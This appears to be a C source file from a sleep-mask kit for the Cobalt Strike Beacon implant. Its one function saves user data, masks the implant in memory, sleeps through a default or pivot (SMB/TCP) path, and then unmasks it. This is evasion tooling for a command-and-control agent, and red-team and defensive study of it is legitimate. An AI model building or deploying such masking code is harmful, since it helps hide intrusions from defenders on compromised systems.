#include <windows.h>

#include "../beacon.h"
#include "../base/helpers.h"
#include "../debug.h"
#include "../sleepmask.h"
#include "../sleepmask-vs.h"

/**
* A wrapper around the default Sleep/PivotSleep to simplify the Sleepmask-VS entry point
*
* @param info A pointer to a SLEEPMASK_INFO structure
*/
void SleepMaskWrapper(PSLEEPMASK_INFO info) {
    DFR_LOCAL(KERNEL32, Sleep);

    // Save any custom user data prior to masking Beacon
    CUSTOM_USER_DATA customUserData;
    _memset(&customUserData, 0, sizeof(CUSTOM_USER_DATA));
    char* customUserDataPtr = BeaconGetCustomUserData();
    if (customUserDataPtr != NULL) {
        _memcpy(&customUserData, customUserDataPtr, sizeof(CUSTOM_USER_DATA));
    }
    
    // Mask Beacon
    MaskBeacon(&info->beacon_info);

    // Sleep
    if (info->reason == DEFAULT_SLEEP) {
        DLOGF("SLEEPMASK: Default sleep (HTTP/HTTPS/DNS)\n");
        Sleep(info->sleep_time);
    }
    else if (info->reason == PIVOT_SLEEP) {
        DLOGF("SLEEPMASK: Pivot sleep (SMB/TCP)\n");
        PivotSleep(info, &customUserData);
    }

    // UnMask Beacon
    UnMaskBeacon(&info->beacon_info);

    return;
}
